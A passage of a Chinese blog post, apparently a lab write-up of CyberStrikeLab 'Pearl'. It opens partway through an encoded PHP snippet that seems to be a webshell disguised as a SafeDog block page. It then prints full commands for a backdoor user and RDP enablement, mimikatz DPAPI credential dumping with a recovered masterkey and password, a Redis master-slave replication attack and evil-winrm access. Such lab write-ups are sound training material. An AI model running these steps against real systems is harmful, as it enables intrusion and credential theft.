GggY2xhc3M9InN0MSIgZD0iTSAyMSA1OCBIIDQgYyAtMi4yIDAgLTQgLTEuOCAtNCAtNCBWIDQ0IGMgMCAtMi4yIDEuOCAtNCA0IC00IGggMTcgYyAyLjIgMCA0IDEuOCA0IDQgdiAxMCBDIDI1IDU2LjIgMjMuMiA1OCAyMSA1OCBaIiAvPgoJCQkJCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0gNDYgMzggSCA0IGMgLTIuMiAwIC00IC0xLjggLTQgLTQgViAyNCBjIDAgLTIuMiAxLjggLTQgNCAtNCBoIDQyIGMgMi4yIDAgNCAxLjggNCA0IHYgMTAgQyA1MCAzNi4yIDQ4LjIgMzggNDYgMzggWiIgLz4KCQkJCQk8cGF0aCBjbGFzcz0ic3QxIiBkPSJNIDczIDM4IEggNTYgYyAtMi4yIDAgLTQgLTEuOCAtNCAtNCBWIDI0IGMgMCAtMi4yIDEuOCAtNCA0IC00IGggMTcgYyAyLjIgMCA0IDEuOCA0IDQgdiAxMCBDIDc3IDM2LjIgNzUuMiAzOCA3MyAzOCBaIiAvPgoJCQkJCTxjaXJjbGUgY2xhc3M9InN0MiIgY3g9IjczIiBjeT0iNDAiIHI9IjIwIiAvPgoJCQkJCTxnPgoJCQkJCQk8cGF0aCBjbGFzcz0ic3QzIiBkPSJNIDczIDIyIGMgOS45IDAgMTggOC4xIDE4IDE4IHMgLTguMSAxOCAtMTggMTggcyAtMTggLTguMSAtMTggLTE4IFMgNjMuMSAyMiA3MyAyMiBNIDczIDIwIGMgLTExIDAgLTIwIDkgLTIwIDIwIHMgOSAyMCAyMCAyMCBzIDIwIC05IDIwIC0yMCBTIDg0IDIwIDczIDIwIEwgNzMgMjAgWiIgLz4KCQkJCQk8L2c%2BCgkJCQkJPHBhdGggY2xhc3M9InN0MyIgZD0iTSA4MyA0MiBIIDYzIGMgLTEuMSAwIC0yIC0wLjkgLTIgLTIgdiAwIGMgMCAtMS4xIDAuOSAtMiAyIC0yIGggMjAgYyAxLjEgMCAyIDAuOSAyIDIgdiAwIEMgODUgNDEuMSA4NC4xIDQyIDgzIDQyIFoiIC8%2BCgkJCQk8L2c%2BCgkJCQk8L3N2Zz4KCQkJPC9kaXY%2BCgkJCQkJCTxkaXYgaWQ9Im1pZCI%2BCgkJCQk8ZGl2IGlkPSJ3YXJtIj4KCQkJCQk8c3Bhbj48Yj7mgqjnmoTor7fmsYLluKbmnInkuI3lkIjms5Xlj4LmlbDvvIzlt7LooqvnvZHnq5nnrqHnkIblkZjorr7nva7mi6bmiKrvvIE8L2I%2BPC9zcGFuPgoJCQkJPC9kaXY%2BCgkJCQk8ZGl2IGlkPSJ0aXAiPgoJCQkJCTxwPuWPr%2BiDveWOn%2BWboO%2B8muaCqOaPkOS6pOeahOWGheWuueWMheWQq%2BWNsemZqeeahOaUu%2BWHu%2Bivt%2BaxgjwvcD4KCQkJCQk8cD7lpoLkvZXop6PlhrPvvJo8L3A%2BCgkJCQkJPGRpdiBpZD0iZXhhbXBsZSI%2BCgkJCQkJCTxwPjHvvInmo4Dmn6Xmj5DkuqTlhoXlrrnvvJs8L3A%2BCgkJCQkJCTxwPjLvvInlpoLnvZHnq5nmiZjnrqHvvIzor7fogZTns7vnqbrpl7Tmj5DkvpvllYbvvJs8L3A%2BCgkJCQkJCTxwPjPvvInmma7pgJrnvZHnq5norr%2FlrqLvvIzor7fogZTns7vnvZHnq5nnrqHnkIblkZg8L3A%2BCgkJCQkJPC9kaXY%2BCgkJCQk8L2Rpdj4KCQkJPC9kaXY%2BCgkJCTxkaXYgaWQ9ImJvbSI%2BCgkJCQk8ZGl2IGlkPSJsZWZ0Ij4KCQkJCQk8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaWQ9IuWbvuWxgl8xIiBzdHlsZT0iIiB2aWV3Qm94PSIwIDAgMzAgMzAiIHg9IjBweCIgeT0iMHB4IiB4bWxuczp4bWw9Imh0dHA6Ly93d3cudzMub3JnL1hNTC8xOTk4L25hbWVzcGFjZSIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIgdmVyc2lvbj0iMS4xIj4KCQkJCQk8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoJCQkJCQkuc3Q0e2ZpbGw6I0RGREZERjt9CgkJCQkJCS5zdDV7ZmlsbDojMDQ1OEIwO30KCQkJCQkJLnN0NntmaWxsOiNFREU3RTY7fQoJCQkJCQkuc3Q3e2ZpbGw6I0Y3RURFQjt9CgkJCQkJCS5zdDh7ZmlsbDojM0I0NTVGO30KCQkJCQk8L3N0eWxlPgoJCQkJCTxnPgoJCQkJCQk8Y2lyY2xlIGNsYXNzPSJzdDQiIGN4PSIxNSIgY3k9IjE1IiByPSIxNSIgLz4KCQkJCQkJPGVsbGlwc2UgY2xhc3M9InN0NSIgY3g9IjE1IiBjeT0iMjMuNSIgcng9IjEyLjQiIHJ5PSI2LjUiIC8%2BCgkJCQkJCTxwYXRoIGNsYXNzPSJzdDYiIGQ9Ik0gMTUgMjIgTCAxNSAyMiBjIC0yLjIgMCAtNCAtMS44IC00IC00IHYgLTMgYyAwIC0yLjIgMS44IC00IDQgLTQgaCAwIGMgMi4yIDAgNCAxLjggNCA0IHYgMyBDIDE5IDIwLjIgMTcuMiAyMiAxNSAyMiBaIiAvPgoJCQkJCQk8ZWxsaXBzZSBjbGFzcz0ic3Q3IiBjeD0iMTUiIGN5PSIxMC41IiByeD0iNSIgcnk9IjcuNSIgLz4KCQkJCQkJPHBvbHlnb24gY2xhc3M9InN0OCIgcG9pbnRzPSIxMSw2IDEzLDggMTksOCAyMCwxMSAyMSwxMSAyMSw1IDE4LDIgMTIsMiA5LDUgOSwxMSAxMCwxMSIgLz4KCQkJCQkJPHBhdGggY2xhc3M9InN0NyIgZD0iTSAxOS41IDEzIGggLTkgQyA5LjcgMTMgOSAxMi4zIDkgMTEuNSB2IDAgYyAwIC0wLjggMC43IC0xLjUgMS41IC0xLjUgaCA5IGMgMC44IDAgMS41IDAuNyAxLjUgMS41IHYgMCBDIDIxIDEyLjMgMjAuMyAxMyAxOS41IDEzIFoiIC8%2BCgkJCQkJPC9nPgoJCQkJCTwvc3ZnPgoJCQkJPC9kaXY%2BCgkJCQk8ZGl2IGlkPSJyaWdodCI%2BCgkJCQkJPHNwYW4%2B5aaC5p6c5oKo5piv572R56uZ566h55CG5ZGY77yM6K%2B355m75b2V5a6J5YWo54uXPC9zcGFuPgoJCQkJCTxhIGhyZWY9Imh0dHA6Ly93d3cuc2FmZWRvZy5jbiI%2BPGlucHV0IHR5cGU9ImJ1dHRvbiIgbmFtZT0iZGV0YWlsIiBpZD0iZGV0YWlsIiB2YWx1ZT0i5p%2Bl55yL6K%2Bm5oOFIj48L2E%2BCgkJCQkJPHNwYW4%2B5oiWPC9zcGFuPgoJCQkJCTxhIGhyZWY9Imh0dHA6Ly9zZWN1cml0eS5zYWZlZG9nLmNuL2luZGV4Lmh0bWwiPjxpbnB1dCB0eXBlPSJidXR0b24iIG5hbWU9ImZlZWRiYWNrIiBpZD0iZmVlZGJhY2siIHZhbHVlPSLlj43ppojor6%2FmiqUiPjwvYT4KCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQkJPGRpdiBpZD0iZm9vdGVyIj4KCQkJCTxmb290ZXI%2BQ29weXJpZ2h0JiN4YTk7MjAxMy0yMDIwIOWOpumXqOacjeS6keS%2FoeaBr%2BenkeaKgOaciemZkOWFrOWPuCBBTEwgUmlnaHRzIFJlc2VydmVkIHwg6Ze9SUNQ5aSHMTQwMTQxMznlj7ctMTwvZm9vdGVyPgoJCQk8L2Rpdj4KCQk8L2Rpdj4KCTwvYm9keT4KPC9odG1sPg%3D%3D%22%3B%0D%0Aif%28+count%28%24_REQUEST%29+%7C%7C+file_get_contents%28%22php%3A%2F%2Finput%22%29+%29%7B%0D%0A%0D%0A%7Delse%7B%0D%0A++++header%28%27Content-Type%3Atext%2Fhtml%3Bcharset%3Dutf-8%27%29%3B++++http_response_code%28200%29%3B%0D%0A++++echo+base64_decode%2F**%2F%28%24yBoZ6A%29%3B%0D%0A%7D</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601225000162.png" class="">
+
+<p>先上线到cs然后去翻翻配置文件什么的</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>还是和之前一样添加后门用户rdp上去关防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>fscan大法扫出了一个sql弱口令</p>
+<img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601232501000.png" class="">
+
+<p>登录发现不行</p>
+<h2 id="RDP远程桌面密码凭证获取"><a href="#RDP远程桌面密码凭证获取" class="headerlink" title="RDP远程桌面密码凭证获取"></a>RDP远程桌面密码凭证获取</h2><p>发现c盘有一个rdp连接，利用mimikatz去破解下密码</p>
+<img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601234014102.png" class="">
+
+
+<p>查看当前主机保存的RDP凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+<img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601234210413.png" class="">
+
+<p>查找本地的Cred</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /a %userprofile%\appdata\local\microsoft\credentials\*</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601234415898.png" class="">
+
+<p>获取到guidmasterkey</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe dpapi::cred /in:C:\Windows\system32\config\systemprofile\appdata\local\microsoft\credentials\F7A11901B817E047275D06BDB5BAF712</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601235117400.png" class="">
+
+<p>然后用这个找到masterkey</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250601235433719.png" class="">
+
+<p>最后使用masterkey来解密凭证文件，得到administrator用户密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F7A11901B817E047275D06BDB5BAF712 /masterkey:d66ec675b7789d8c929b9d887b63b8cdcdb0607b0ef6af226865964125c83e31608db9a7495a126ed80f04f854a4ff3c1393da53fe64e1080b2b10e2d933ee38&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250602000148938.png" class="">
+
+<p>获取到密码Lmxcms@cslab!<br>参考： <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36618918/article/details/130677478">https://blog.csdn.net/qq_36618918/article/details/130677478</a></p>
+<h2 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h2><p>给目标机器安装一个python环境然后用脚本打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-attack.py -r 10.0.0.56 -L 10.0.0.65 -b</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/20250602003848832.png" class="">
+
+<p>最后一个flag需要爆破密码才可以 密码为qwe!@#123</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 evil-winrm -i 10.0.0.23 -u Administrator -p &#x27;qwe!@#123&#x27;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/link/">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A2%A6%E6%83%B3cms-sql%E6%B3%A8%E5%85%A5-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">梦想cms sql注入 + 后台文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96"><span class="toc-number">3.</span> <span class="toc-text">RDP远程桌面密码凭证获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">4.</span> <span class="toc-text">Redis主从复制</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&text=cyberstrikelab-Pearl"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&title=cyberstrikelab-Pearl"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&is_video=false&description=cyberstrikelab-Pearl"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=cyberstrikelab-Pearl&body=Check out this article: https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&title=cyberstrikelab-Pearl"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&title=cyberstrikelab-Pearl"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&title=cyberstrikelab-Pearl"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&title=cyberstrikelab-Pearl"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&name=cyberstrikelab-Pearl&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/06/01/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Pearl/&t=cyberstrikelab-Pearl"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Oceanzbz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QWTJSPQL4F');
+</script>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
